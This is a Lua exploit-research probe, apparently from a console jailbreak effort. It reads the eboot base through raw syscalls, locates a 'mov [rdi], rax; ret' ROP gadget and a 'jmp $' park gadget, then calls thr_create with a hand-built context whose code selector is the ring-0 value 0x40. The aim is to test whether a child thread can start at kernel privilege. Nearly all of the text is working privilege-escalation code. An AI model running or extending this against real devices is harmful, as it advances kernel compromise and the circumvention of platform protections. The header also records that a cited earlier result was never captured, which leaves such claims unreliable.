-- CRASH_CLASS: HIGH
-- PROBE 448a: does thr_create honour a kernel code selector?
--
-- 156c/156d proved a child thread runs our RIP when CS = 0x43 (ring 3).
-- The 13.60 decode says set_mcontext copies CS from the user ucontext
-- without OR-ing SEL_RPL_MASK. 0x40 is the same selector index as 0x43
-- with RPL 0, so if the copy is unfiltered the child starts at CPL 0.
--
-- CLAUDE.md cites "probe 189a (CS=0x40 -> live thread, no panic)" but no
-- such probe, capture or commit exists in this repository, so 14.10's
-- behaviour with a kernel selector has never been recorded here.
--
-- This probe runs two children in one process:
--   [A] CS = 0x43 - control, must write the marker (harness works)
--   [B] CS = 0x40 - the experiment
-- Both use eboot's `mov [rdi], rax; ret` gadget, then park on `jmp $`.
--
-- Outcomes for [B]:
--   marker written        -> the thread executed; next question is CPL
--   [B] no marker, alive  -> selector replaced or thread never scheduled
--   process dies / panic  -> a ring-0 fault on user memory (SMEP/SMAP)

print("=== PROBE 448a: THR_CREATE KERNEL SELECTOR ===")
print("")

local Z = uint64(0)
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(sc, ...)
    local ok, rv = pcall(function(...) return sc(...) end, ...)
    if ok then return to_num(rv) end
    return -999
end
local function rd32(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end return -1 end
local function rd64r(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end return nil end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(v) return string.format("0x%X", v) end

-- eboot text base via sys 593
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
wd(info, 0x160)
local base = 0
if call(sc_info, Z, info) == 0 then
    local lo = rd32(info + 0x108)
    local hi = rd32(info + 0x10C)
    if lo and hi and hi >= 0 and lo >= 0 then base = hi * 4294967296 + lo end
end
if base == 0 then print("  no eboot base"); return end

-- write gadget: mov [rdi], rax; ret
local GDP = base + 0x92C67
local g = nil
pcall(function() g = memory.read_buffer(GDP, 4) end)
local bytes = ""
if type(g) == "string" then
    for i = 1, #g do bytes = bytes .. string.format("%02X", string.byte(g, i)) end
end
print(string.format("  eboot base=%s gadget=%s bytes=%s", fmt(base), fmt(GDP), bytes))
if bytes ~= "488907C3" then print("  gadget bytes differ - aborting"); return end

-- park gadget: jmp $
local PARK = 0
local scan = nil
pcall(function() scan = memory.read_buffer(base, 0x40000) end)
if type(scan) == "string" then
    local i = 1
    while i < #scan do
        if string.byte(scan, i) == 0xEB and string.byte(scan, i + 1) == 0xFE then
            PARK = base + (i - 1); break
        end
        i = i + 1
    end
end
print(string.format("  park=%s", fmt(PARK)))
if PARK == 0 then print("  no jmp $ found"); return end

local MAGIC_HI, MAGIC_LO = 0x1234, 0x567890AB  -- 0x1234567890AB, split for u64()
local sc_thr = make_syscall(430)

local function run_child(cs, tag)
    -- mmap, not memory.alloc: the context needs a numeric address
    local marker = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
    if marker < 0 then print("  marker mmap failed"); return -1 end
    local ctx = memory.alloc(0x500)
    local out = call(make_syscall(477), Z, uint64(0x1000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
    if out < 0 then print("  out mmap failed"); return -1 end
    wq(marker, Z)
    -- zero the context
    local i = 0
    while i < 0x500 do wq(ctx + i, Z); i = i + 8 end
    wd(ctx + 0x0d0, 0)          -- flags  <= 7
    wq(ctx + 0x108, u64(0, 0x480))   -- magic
    wq(ctx + 0x110, u64(0, 0x10000)) -- type
    wq(ctx + 0x0c0, u64(0, cs))      -- CS
    wq(ctx + 0x100, u64(0, 0x3b))    -- SS
    wq(ctx + 0x0f0, u64(0, 0x202))   -- RFLAGS: IF set
    wq(ctx + 0x0e0, u64(0, GDP))     -- RIP
    wq(ctx + 0x048, u64(0, marker))          -- RDI
    wq(ctx + 0x078, u64(MAGIC_HI, MAGIC_LO)) -- RAX
    -- stack: ret from the gadget lands on the park
    local stack = call(make_syscall(477), Z, uint64(0x200000), uint64(3), uint64(0x1002), u64(0xFFFFFFFF, 0xFFFFFFFF), Z)
    if stack < 0 then print("  mmap failed"); return -1 end
    local sp = stack + 0x100000
    wq(ctx + 0x0f8, u64(0, sp))
    wq(sp, u64(0, PARK))
    wd(marker, 0x5A5A)

    local rv = call(sc_thr, ctx, out, Z, Z, Z, Z)
    local tid = rd64r(out)
    print(string.format("[%s] CS=0x%X thr_create rv=%d tid=%s", tag, cs, rv, tid and fmt(to_num(tid)) or "nil"))
    -- give the child a moment: a userland busy loop
    local x = 0
    local t0 = 0
    while x < 2000000 do x = x + 1 end
    local m = rd32(marker)
    print(string.format("[%s] marker=0x%X  %s", tag, m or 0,
        (m == MAGIC_LO) and "EXECUTED" or "not written"))
    return m
end

print("[A] control CS=0x43")
run_child(0x43, "A")
print("")
print("[B] experiment CS=0x40")
run_child(0x40, "B")
print("")
print("=== 448a DONE ===")
